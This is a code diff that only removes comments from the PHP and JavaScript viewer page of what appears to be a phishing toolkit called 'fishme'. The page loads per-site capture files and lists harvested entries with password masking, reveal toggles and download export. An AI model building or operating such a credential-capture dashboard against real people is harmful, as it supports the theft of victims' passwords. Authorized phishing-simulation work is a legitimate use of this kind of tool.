@@ -9,7 +9,6 @@ $activeSite = getenv('FISHME_ACTIVE_SITE') ?: null;
 
 if (is_dir($captureDir)) {
     if ($activeSite) {
-        // Only load the file for the active site
         $file = $captureDir . '/' . $activeSite . '.json';
         if (file_exists($file)) {
             $content = file_get_contents($file);
@@ -23,7 +22,7 @@ if (is_dir($captureDir)) {
             }
         }
     } else {
-        // Load all files if no active site is set (e.g., when running 'fishme capture')
+
         $files = glob($captureDir . '/*.json');
         foreach ($files as $file) {
             $site = basename($file, '.json');
@@ -40,7 +39,7 @@ if (is_dir($captureDir)) {
     }
 }
 
-// Sort data by timestamp descending
+
 usort($data, function($a, $b) {
     return strtotime($b['timestamp'] ?? 0) - strtotime($a['timestamp'] ?? 0);
 });
@@ -64,6 +63,7 @@ $statsData = json_encode($stats, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | 
             min-height: 100vh;
             padding: 2rem;
             position: relative;
+            
         }
         body::before {
             content: '';
@@ -366,7 +366,7 @@ $statsData = json_encode($stats, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | 
                 </tr>
             </thead>
             <tbody id="tableBody">
-                <!-- Data will be injected here -->
+                
             </tbody>
         </table>
     </div>
@@ -380,10 +380,10 @@ $statsData = json_encode($stats, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | 
     let showPasswords = {};
 
     function init() {
-        // Populate stats
+        
         document.getElementById('stat-total').textContent = statsData.total;
 
-        // Add event listeners
+
         document.getElementById('searchInput').addEventListener('input', applyFilters);
 
         renderTable();
@@ -420,7 +420,7 @@ $statsData = json_encode($stats, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | 
         filteredData.forEach((row, index) => {
             const tr = document.createElement('tr');
             
-            // Mask password if not toggled
+        
             const passLength = row.password ? row.password.length : 0;
             const displayPass = showPasswords[index] ? row.password : '*'.repeat(Math.min(passLength, 15));
             const toggleIcon = showPasswords[index] ? 'hide' : 'View';
@@ -499,7 +499,7 @@ $statsData = json_encode($stats, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | 
     function downloadFile(content, fileName, mimeType) {
         const blob = new Blob([content], { type: mimeType });
         const link = document.createElement('a');
-        if (navigator.msSaveBlob) { // IE 10+
+        if (navigator.msSaveBlob) { 
             navigator.msSaveBlob(blob, fileName);
         } else {
             const url = URL.createObjectURL(blob);
@@ -511,7 +511,7 @@ $statsData = json_encode($stats, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | 
         }
     }
 
-    // Initialize the application
+
     init();
 </script>
 
